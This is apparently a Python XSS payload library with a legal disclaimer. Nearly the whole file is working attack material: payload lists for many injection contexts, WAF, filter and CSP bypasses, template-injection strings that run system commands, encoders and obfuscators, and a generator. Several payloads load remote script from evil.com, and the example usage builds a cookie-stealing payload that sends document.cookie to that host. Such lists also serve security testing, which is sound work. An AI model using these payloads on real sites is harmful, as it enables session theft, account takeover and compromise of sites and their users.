"""
XSS (Cross-Site Scripting) Payloads Library - Enhanced Edition

IMPORTANT LEGAL NOTICE:
This library is intended ONLY for authorized security testing, penetration testing,
bug bounty programs, and educational purposes. Unauthorized testing of web applications
is illegal. Always obtain explicit written permission before testing any system.

Usage of this library for attacking targets without consent is illegal and unethical.
The developers assume no liability for misuse of this tool.
"""

import urllib.parse
import base64
import html
import json
from typing import List, Dict, Optional, Callable
from enum import Enum


class XSSContext(Enum):
    """Defines different XSS injection contexts."""
    HTML = "html"
    ATTRIBUTE = "attribute"
    JAVASCRIPT = "javascript"
    URL = "url"
    CSS = "css"
    JSON = "json"
    XML = "xml"
    TEMPLATE = "template"
    DOM = "dom"
    MARKDOWN = "markdown"


class BypassTechnique(Enum):
    """WAF and filter bypass techniques."""
    CASE_VARIATION = "case"
    ENCODING = "encoding"
    OBFUSCATION = "obfuscation"
    COMMENT_INJECTION = "comment"
    WHITESPACE = "whitespace"
    NULL_BYTE = "null_byte"
    MUTATION = "mutation"


# ============================================================================
# BASIC XSS PAYLOADS
# ============================================================================

# Basic script-based XSS
BASIC = [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(window.origin)</script>",
    "<script>alert(localStorage)</script>",
    "<script>confirm('XSS')</script>",
    "<script>prompt('XSS')</script>",
    "<script>console.log('XSS')</script>",
    "<script src=//evil.com/xss.js></script>",
    "<script src=https://evil.com/xss.js></script>",
    "<script src='//evil.com/xss.js'></script>",
]

# Image-based XSS
IMG_PAYLOADS = [
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(1)>",
    "<img src='x' onerror='alert(1)'>",
    "<img src=\"x\" onerror=\"alert(1)\">",
    "<img/src=x onerror=alert(1)>",
    "<img src=x:x onerror=alert(1)>",
    "<img src=1 onerror=alert(1)>",
    "<img src=javascript:alert('XSS')>",
    "<img src onerror=alert(1)>",
    "<img src=# onerror=alert(1)>",
    "<img src= onerror=alert(1)>",
    "<img/onerror=alert(1) src=x>",
    "<img srcset=x onerror=alert(1)>",
]

# SVG-based XSS
SVG_PAYLOADS = [
    "<svg onload=alert('XSS')>",
    "<svg/onload=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg onload=alert(1)//",
    "<svg><script>alert(1)</script></svg>",
    "<svg><script>alert(1)</script>",
    "<svg><animate onbegin=alert(1)>",
    "<svg><animatetransform onbegin=alert(1)>",
    "<svg><set attributeName=onload to=alert(1)>",
    "<svg><a xlink:href=javascript:alert(1)><text x=0 y=20>XSS</text></a></svg>",
    "<svg><use href=data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x />",
]

# Event handler-based XSS
EVENT_HANDLERS = [
    # Body/document events
    "<body onload=alert('XSS')>",
    "<body onpageshow=alert(1)>",
    "<body onhashchange=alert(1)>",
    "<body onfocus=alert(1)>",
    "<body onresize=alert(1)>",
    
    # Input events
    "<input onfocus=alert(1) autofocus>",
    "<input onblur=alert(1) autofocus><input autofocus>",
    "<input type=image src=x onerror=alert(1)>",
    "<input type=text value=x onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    
    # Media events
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<video poster=javascript:alert(1)>",
    
    # HTML5 elements
    "<details open ontoggle=alert(1)>",
    "<details ontoggle=alert(1) open>",
    "<marquee onstart=alert(1)>",
    "<marquee onscroll=alert(1)>",
    
    # Links and navigation
    "<a href=javascript:alert(1)>click</a>",
    "<a href='javascript:alert(1)'>click</a>",
    "<a href=\"javascript:alert(1)\">click</a>",
    
    # Frames
    "<iframe src=javascript:alert(1)>",
    "<iframe onload=alert(1)>",
    "<iframe src=data:text/html,<script>alert(1)</script>>",
    
    # Objects and embeds
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    
    # Form elements
    "<form action=javascript:alert(1)><input type=submit>",
    "<form><button formaction=javascript:alert(1)>X</button>",
    "<button onclick=alert(1)>click</button>",
    
    # Obsolete but sometimes working
    "<isindex action=javascript:alert(1) type=submit>",
    "<bgsound src=javascript:alert(1)>",
]

# Attribute injection payloads
ATTRIBUTE_INJECTION = [
    # Breaking out of single quotes
    "' onmouseover='alert(1)' x='",
    "' onfocus='alert(1)' autofocus='",
    "' onclick='alert(1)' x='",
    "' onerror='alert(1)' x='",
    
    # Breaking out of double quotes
    "\" onmouseover=\"alert(1)\" x=\"",
    "\" onfocus=\"alert(1)\" autofocus=\"",
    "\" onclick=\"alert(1)\" x=\"",
    "\" onerror=\"alert(1)\" x=\"",
    
    # Breaking out of tags
    "><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "</script><script>alert(1)</script>",
    
    # Additional context breaks
    "\" onmouseover=alert(1) foo=\"",
    "' onmouseover=alert(1) foo='",
    "' autofocus onfocus=alert(1) x='",
    "\" autofocus onfocus=alert(1) x=\"",
    
    # No quotes needed
    " onmouseover=alert(1) ",
    " onfocus=alert(1) autofocus ",
]

# ============================================================================
# ENCODING & OBFUSCATION
# ============================================================================

# URL encoded payloads
URL_ENCODED = [
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
    "%3Csvg%20onload%3Dalert(1)%3E",
]

# HTML entity encoded
HTML_ENTITY_ENCODED = [
    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "&#x3C;img src=x onerror=alert(1)&#x3E;",
]

# JavaScript encoded
JS_ENCODED = [
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    "\\u{3c}script\\u{3e}alert(1)\\u{3c}/script\\u{3e}",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",  # base64: alert(1)
]

# Unicode/UTF-7 encoded
UNICODE_ENCODED = [
    "+ADw-script+AD4-alert(1)+ADw-/script+AD4-",  # UTF-7
    "\u003cscript\u003ealert(1)\u003c/script\u003e",
    "<script>alert\u0028\u0031\u0029</script>",
]

# ============================================================================
# FILTER BYPASS TECHNIQUES
# ============================================================================

# Case variation
CASE_BYPASS = [
    "<ScRiPt>alert(1)</sCrIpT>",
    "<sCrIpT>alert(1)</ScRiPt>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<iMg sRc=x oNeRrOr=alert(1)>",
    "<SvG OnLoAd=alert(1)>",
]

# Tag nesting/mutation
MUTATION_XSS = [
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<<script>alert(1)//<</script>",
    "<script><script>alert(1)</script>",
    "<script src=<script>alert(1)</script>",
    "<noscript><script>alert(1)</script></noscript>",
    "<noscript><style><script>alert(1)</script></style></noscript>",
]

# Null byte injection
NULL_BYTE_BYPASS = [
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    "<img\x00src=x onerror=alert(1)>",
    "java\x00script:alert(1)",
]

# Comment injection
COMMENT_BYPASS = [
    "<script><!--alert(1)--></script>",
    "<script>/**/alert(1)/**/</ script>",
    "<img src=x/***/onerror=alert(1)>",
    "<svg/onload=alert(1)//",
    "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */alert(1))//>",
]

# Whitespace/newline bypass
WHITESPACE_BYPASS = [
    "<img\nsrc=x\nonerror=alert(1)>",
    "<img\tsrc=x\tonerror=alert(1)>",
    "<img\rsrc=x\ronerror=alert(1)>",
    "<svg\nonload=alert(1)>",
    "java\nscript:alert(1)",
    "java&#x0A;script:alert(1)",
    "java&#x0D;script:alert(1)",
    "java\tscript:alert(1)",
    "java&#x09;script:alert(1)",
]

# Quote/backtick bypass
QUOTE_BYPASS = [
    "<img src=`x`onerror=alert(1)>",
    "<img src='`'onerror=alert(1)>",
    "<img src=\"\\\"onerror=alert(1)>",
    "<img src=''onerror=alert(1)>",
    "<img src=\"\"onerror=alert(1)>",
]

# Protocol handler bypass
PROTOCOL_BYPASS = [
    "javascript:alert(1)",
    "javascript:alert(1)//",
    "javascript://comment%0aalert(1)",
    "javascript:void(alert(1))",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "vbscript:msgbox(1)",
    "jAvAsCrIpT:alert(1)",
    "javas\tcript:alert(1)",
    "JaVaScRiPt:alert(1)",
]

# ============================================================================
# CONTEXT-SPECIFIC PAYLOADS
# ============================================================================

# DOM-based XSS payloads
DOM_BASED = [
    # URL fragment
    "#<script>alert(1)</script>",
    "#<img src=x onerror=alert(1)>",
    
    # Query parameters
    "?param=<script>alert(1)</script>",
    "?param=<img src=x onerror=alert(1)>",
    
    # Protocol handlers
    "javascript:alert(document.domain)",
    "javascript:eval(atob(location.hash.slice(1)))",
    
    # Data URIs
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    
    # DOM manipulation
    "<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jLzEiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk= onerror=eval(atob(this.id))>",
]

# JavaScript context payloads
JAVASCRIPT_CONTEXT = [
    "'-alert(1)-'",
    "'-alert(1)//",
    "\\'-alert(1)//",
    "\";alert(1);//",
    "</script><script>alert(1)</script>",
    "</script><script>alert(1)</script><script>",
    "'-prompt(1)-'",
    "\\';}alert(1);//",
    "'; alert(1); var x='",
    "\"; alert(1); var x=\"",
    "}; alert(1); {",
]

# CSS context payloads
CSS_CONTEXT = [
    "</style><script>alert(1)</script>",
    "</style><img src=x onerror=alert(1)>",
    "expression(alert(1))",  # IE only
    "javascript:alert(1)",
    "behavior:url(xss.htc)",  # IE only
    "url('javascript:alert(1)')",
    "@import 'javascript:alert(1)';",
]

# JSON context payloads
JSON_CONTEXT = [
    '{"test":"</script><script>alert(1)</script>"}',
    '{"test":"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"}',
    '{"test":"<img src=x onerror=alert(1)>"}',
]

# XML context payloads
XML_CONTEXT = [
    "<test><![CDATA[<script>alert(1)</script>]]></test>",
    "</test><script>alert(1)</script><test>",
    "<test>&lt;script&gt;alert(1)&lt;/script&gt;</test>",
]

# ============================================================================
# ADVANCED TECHNIQUES
# ============================================================================

# Template injection (SSTI leading to XSS)
TEMPLATE_INJECTION = [
    # General/Angular
    "{{7*7}}",
    "{{constructor.constructor('alert(1)')()}}",
    "{{[].constructor.constructor('alert(1)')()}}",
    
    # Vue.js
    "{{_c.constructor('alert(1)')()}}",
    
    # Jinja2/Flask
    "{{ ''.__class__.__mro__[1].__subclasses__() }}",
    
    # JSP
    "${7*7}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    
    # Thymeleaf
    "#{7*7}",
    
    # ERB (Ruby)
    "<%= 7*7 %>",
    "<%= system('id') %>",
    
    # Smarty
    "{$smarty.version}",
    "{php}echo `id`;{/php}",
]

# DOM Clobbering
DOM_CLOBBERING = [
    "<form name=x><input id=y></form>",
    "<img name=x id=y>",
    "<a id=x><a id=x name=y href=javascript:alert(1)>click</a>",
    "<form id=x name=y><input id=z></form>",
    "<iframe name=x srcdoc='<script>alert(parent.x)</script>'>",
]

# Dangling markup injection
DANGLING_MARKUP = [
    "<img src='",
    "<img src=\"",
    "<style>@import'",
    "<link rel='stylesheet' href='",
    "<base href='",
]

# postMessage XSS
POST_MESSAGE_XSS = [
    "<script>window.postMessage('<img src=x onerror=alert(1)>','*')</script>",
    "<script>window.postMessage('{\"xss\":\"<script>alert(1)</script>\"}','*')</script>",
]

# Content Security Policy (CSP) bypass
CSP_BYPASS = [
    # JSONP endpoint abuse
    "<script src=https://trusted-site.com/jsonp?callback=alert></script>",
    
    # AngularJS (if allowed)
    "<script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.js></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
    
    # Base tag injection
    "<base href='https://evil.com/'>",
    
    # Script gadgets
    "<div ng-app ng-csp>{{$on.constructor('alert(1)')()}}</div>",
    
    # Import maps (modern browsers)
    "<script type=importmap>{\"imports\":{\"x\":\"data:text/javascript,alert(1)\"}}</script><script type=module>import 'x'</script>",
]

# Mutation XSS (mXSS) - browser parsing quirks
MUTATION_XSS_ADVANCED = [
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    "<svg><style><img src=x onerror=alert(1)></style></svg>",
    "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=x onerror=alert(1)>\">",
    "<listing>&lt;img src=x onerror=alert(1)&gt;</listing>",
]

# Prototype pollution leading to XSS
PROTOTYPE_POLLUTION_XSS = [
    "__proto__[innerHTML]=<img src=x onerror=alert(1)>",
    "constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>",
    "__proto__.innerHTML=<img src=x onerror=alert(1)>",
]

# ============================================================================
# FRAMEWORK-SPECIFIC PAYLOADS
# ============================================================================

# React-specific
REACT_XSS = [
    # dangerouslySetInnerHTML
    '{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(1)>"}}',
    
    # href with javascript:
    'javascript:alert(1)',
    
    # Server-side rendering
    '{"$$typeof":"Symbol(react.element)","type":"div","props":{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(1)>"}}}',
]

# Vue.js-specific
VUE_XSS = [
    # v-html directive
    "<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>",
    
    # Template expression
    "{{constructor.constructor('alert(1)')()}}",
    
    # Event binding
    "<div @click=\"$event.target.ownerDocument.defaultView.alert(1)\">click</div>",
]

# Angular-specific
ANGULAR_XSS = [
    # Template expression (AngularJS 1.x)
    "{{constructor.constructor('alert(1)')()}}",
    "{{$on.constructor('alert(1)')()}}",
    
    # Property binding (Angular 2+)
    "[innerHTML]=\"'<img src=x onerror=alert(1)>'\"",
    
    # Bypassing sanitizer
    "{{toString.constructor.prototype.toString.call(''.concat).replace(/^.{.+}$/,'alert(1)')}}",
]

# Svelte-specific
SVELTE_XSS = [
    # @html directive
    "{@html '<img src=x onerror=alert(1)>'}",
    
    # Script context
    "<script>alert(1)</script>",
]

# ============================================================================
# POLYGLOT PAYLOADS
# ============================================================================

# Polyglot payloads (work in multiple contexts)
POLYGLOT = [
    # The classic
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    
    # Shorter versions
    "'\"--></style></script><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)><\"",
    "'-alert(1)-'",
    "'-alert(1)//",
    "\\'-alert(1)//",
    
    # Context-agnostic
    "'\"><script>alert(1)</script>",
    "'><script>alert(1)</script><'",
    "\"><svg/onload=alert(1)><\"",
    
    # Multi-context
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
]

# ============================================================================
# PAYLOAD GENERATOR & UTILITIES
# ============================================================================

class XSSEncoder:
    """Encodes XSS payloads for various bypass techniques."""
    
    @staticmethod
    def url_encode(payload: str, full: bool = False) -> str:
        """URL encode a payload."""
        if full:
            return ''.join(f'%{ord(c):02x}' for c in payload)
        return urllib.parse.quote(payload)
    
    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Double URL encode a payload."""
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    @staticmethod
    def html_entity_encode(payload: str, decimal: bool = False) -> str:
        """HTML entity encode a payload."""
        if decimal:
            return ''.join(f'&#{ord(c)};' for c in payload)
        return ''.join(f'&#x{ord(c):x};' for c in payload)
    
    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode encode a payload."""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    @staticmethod
    def hex_encode(payload: str) -> str:
        """Hex encode a payload."""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    
    @staticmethod
    def base64_encode(payload: str) -> str:
        """Base64 encode a payload."""
        return base64.b64encode(payload.encode()).decode()
    
    @staticmethod
    def random_case(payload: str) -> str:
        """Randomize case in payload."""
        import random
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
    
    @staticmethod
    def add_null_bytes(payload: str) -> str:
        """Add null bytes to payload."""
        # Insert null bytes strategically
        keywords = ['script', 'img', 'svg', 'iframe', 'onerror', 'onload']
        result = payload
        for keyword in keywords:
            if keyword in result.lower():
                idx = result.lower().index(keyword)
                result = result[:idx+3] + '\x00' + result[idx+3:]
                break
        return result
    
    @staticmethod
    def obfuscate_javascript(code: str) -> str:
        """Obfuscate JavaScript code."""
        # Convert to String.fromCharCode
        char_codes = ','.join(str(ord(c)) for c in code)
        return f"eval(String.fromCharCode({char_codes}))"


class XSSPayloadGenerator:
    """Generates context-aware XSS payloads."""
    
    def __init__(self):
        self.encoder = XSSEncoder()
    
    def get_payloads(
        self,
        context: XSSContext = XSSContext.HTML,
        target_framework: Optional[str] = None,
        bypass_filters: bool = False,
        encode: bool = False
    ) -> List[str]:
        """
        Get payloads for specific context.
        
        Args:
            context: Injection context
            target_framework: Target framework (react, vue, angular)
            bypass_filters: Include filter bypass techniques
            encode: Apply encoding
            
        Returns:
            List of appropriate payloads
        """
        payloads = []
        
        # Select base payloads based on context
        if context == XSSContext.HTML:
            payloads = BASIC + IMG_PAYLOADS + SVG_PAYLOADS + EVENT_HANDLERS
        elif context == XSSContext.ATTRIBUTE:
            payloads = ATTRIBUTE_INJECTION + EVENT_HANDLERS
        elif context == XSSContext.JAVASCRIPT:
            payloads = JAVASCRIPT_CONTEXT
        elif context == XSSContext.URL:
            payloads = DOM_BASED + PROTOCOL_BYPASS
        elif context == XSSContext.CSS:
            payloads = CSS_CONTEXT
        elif context == XSSContext.JSON:
            payloads = JSON_CONTEXT
        elif context == XSSContext.XML:
            payloads = XML_CONTEXT
        elif context == XSSContext.TEMPLATE:
            payloads = TEMPLATE_INJECTION
        elif context == XSSContext.DOM:
            payloads = DOM_BASED + DOM_CLOBBERING
        
        # Add framework-specific payloads
        if target_framework:
            framework_map = {
                'react': REACT_XSS,
                'vue': VUE_XSS,
                'angular': ANGULAR_XSS,
                'svelte': SVELTE_XSS,
            }
            if target_framework.lower() in framework_map:
                payloads.extend(framework_map[target_framework.lower()])
        
        # Add bypass techniques
        if bypass_filters:
            payloads.extend(CASE_BYPASS)
            payloads.extend(MUTATION_XSS)
            payloads.extend(COMMENT_BYPASS)
            payloads.extend(WHITESPACE_BYPASS)
            payloads.extend(QUOTE_BYPASS)
            payloads.extend(POLYGLOT)
        
        # Apply encoding if requested
        if encode:
            encoded_payloads = []
            for payload in payloads[:50]:  # Limit to avoid explosion
                encoded_payloads.append(self.encoder.url_encode(payload))
                encoded_payloads.append(self.encoder.html_entity_encode(payload))
            payloads.extend(encoded_payloads)
        
        return payloads
    
    def generate_event_handler(
        self,
        event: str,
        payload: str = "alert(1)",
        tag: str = "img"
    ) -> str:
        """
        Generate event handler-based XSS.
        
        Args:
            event: Event name (onload, onerror, onclick, etc.)
            payload: JavaScript payload
            tag: HTML tag
            
        Returns:
            XSS payload string
        """
        if tag == "img":
            return f"<img src=x {event}={payload}>"
        elif tag == "svg":
            return f"<svg {event}={payload}>"
        elif tag == "body":
            return f"<body {event}={payload}>"
        elif tag == "input":
            return f"<input {event}={payload} autofocus>"
        else:
            return f"<{tag} {event}={payload}></{tag}>"
    
    def generate_dom_xss(
        self,
        source: str = "location.hash",
        sink: str = "innerHTML"
    ) -> str:
        """
        Generate DOM-based XSS demonstration.
        
        Args:
            source: DOM source (location.hash, location.search, etc.)
            sink: DOM sink (innerHTML, eval, etc.)
            
        Returns:
            Payload that exploits the source-sink flow
        """
        if sink == "innerHTML":
            return f"<img src=x onerror=alert({source})>"
        elif sink == "eval":
            return "alert(1)"
        elif sink == "document.write":
            return "<script>alert(1)</script>"
        else:
            return f"<img src=x onerror=alert(1)>"
    
    def generate_csp_bypass(
        self,
        allowed_domain: str,
        technique: str = "jsonp"
    ) -> str:
        """
        Generate CSP bypass payload.
        
        Args:
            allowed_domain: Domain allowed by CSP
            technique: Bypass technique
            
        Returns:
            CSP bypass payload
        """
        if technique == "jsonp":
            return f"<script src=https://{allowed_domain}/jsonp?callback=alert></script>"
        elif technique == "angular":
            return f"<script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.js></script><div ng-app ng-csp>{{{{$eval.constructor('alert(1)')()}}}}</div>"
        elif technique == "base":
            return f"<base href='https://evil.com/'>"
        else:
            return f"<script src=https://{allowed_domain}/vuln.js></script>"
    
    def generate_mutation_xss(self, base_payload: str) -> List[str]:
        """
        Generate mutation XSS variants.
        
        Args:
            base_payload: Base XSS payload
            
        Returns:
            List of mutation variants
        """
        variants = []
        
        # Nesting
        if "<script>" in base_payload:
            variants.append(base_payload.replace("<script>", "<scr<script>ipt>"))
        
        # Noscript wrapper
        variants.append(f"<noscript>{base_payload}</noscript>")
        
        # Style wrapper
        variants.append(f"<style>{base_payload}</style>")
        
        return variants


# ============================================================================
# CONVENIENCE FUNCTIONS
# ============================================================================

def get_payloads_for_context(
    context: str = "html",
    include_bypass: bool = False
) -> List[str]:
    """
    Get appropriate payloads for a given context (legacy function).
    
    Args:
        context: Injection context
        include_bypass: Include filter bypass payloads
        
    Returns:
        List of payloads
    """
    generator = XSSPayloadGenerator()
    
    # Map string context to enum
    context_map = {
        "html": XSSContext.HTML,
        "attribute": XSSContext.ATTRIBUTE,
        "javascript": XSSContext.JAVASCRIPT,
        "url": XSSContext.URL,
        "css": XSSContext.CSS,
        "json": XSSContext.JSON,
        "xml": XSSContext.XML,
        "template": XSSContext.TEMPLATE,
        "dom": XSSContext.DOM,
    }
    
    ctx = context_map.get(context.lower(), XSSContext.HTML)
    
    return generator.get_payloads(context=ctx, bypass_filters=include_bypass)


def get_payloads_for_waf_bypass() -> List[str]:
    """Get payloads designed to bypass WAFs."""
    return (
        CASE_BYPASS +
        MUTATION_XSS +
        NULL_BYTE_BYPASS +
        COMMENT_BYPASS +
        WHITESPACE_BYPASS +
        QUOTE_BYPASS +
        PROTOCOL_BYPASS +
        POLYGLOT +
        URL_ENCODED +
        HTML_ENTITY_ENCODED
    )


def get_all_payloads() -> List[str]:
    """Get all available XSS payloads."""
    return (
        BASIC +
        IMG_PAYLOADS +
        SVG_PAYLOADS +
        EVENT_HANDLERS +
        ATTRIBUTE_INJECTION +
        DOM_BASED +
        JAVASCRIPT_CONTEXT +
        TEMPLATE_INJECTION
    )


# All payloads combined (for backward compatibility)
ALL_PAYLOADS = get_all_payloads()


if __name__ == "__main__":
    """Example usage demonstrating the library capabilities."""
    
    print("=" * 70)
    print("XSS PAYLOADS LIBRARY - EXAMPLE USAGE")
    print("=" * 70)
    print()
    
    # Example 1: Context-aware payloads
    print("Example 1: HTML Context Payloads")
    print("-" * 70)
    html_payloads = get_payloads_for_context("html")
    for i, payload in enumerate(html_payloads[:5], 1):
        print(f"{i}. {payload}")
    print(f"... ({len(html_payloads)} total)")
    print()
    
    # Example 2: Framework-specific payloads
    print("Example 2: React-Specific Payloads")
    print("-" * 70)
    generator = XSSPayloadGenerator()
    react_payloads = generator.get_payloads(
        context=XSSContext.HTML,
        target_framework="react"
    )
    for i, payload in enumerate([p for p in react_payloads if 'react' in str(p).lower() or 'innerHTML' in p][:3], 1):
        print(f"{i}. {payload}")
    print()
    
    # Example 3: Event handler generation
    print("Example 3: Custom Event Handler")
    print("-" * 70)
    custom = generator.generate_event_handler("onload", "fetch('//evil.com?c='+document.cookie)", "body")
    print(custom)
    print()
    
    # Example 4: Encoded payloads
    print("Example 4: Encoded Payloads")
    print("-" * 70)
    encoder = XSSEncoder()
    sample = "<script>alert(1)</script>"
    print(f"Original: {sample}")
    print(f"URL: {encoder.url_encode(sample)}")
    print(f"HTML Entity: {encoder.html_entity_encode(sample)}")
    print(f"Unicode: {encoder.unicode_encode(sample)}")
    print(f"Obfuscated: {encoder.obfuscate_javascript('alert(1)')}")
    print()
    
    # Example 5: WAF bypass
    print("Example 5: WAF Bypass Payloads")
    print("-" * 70)
    waf_bypass = get_payloads_for_waf_bypass()
    for i, payload in enumerate(waf_bypass[:5], 1):
        print(f"{i}. {payload}")
    print(f"... ({len(waf_bypass)} total)")
    print()
    
    # Example 6: CSP bypass
    print("Example 6: CSP Bypass")
    print("-" * 70)
    csp_bypass = generator.generate_csp_bypass("trusted-cdn.com", "jsonp")
    print(csp_bypass)
    print()
    
    print("=" * 70)
    print(f"Total payloads available: {len(ALL_PAYLOADS)}")
    print("=" * 70)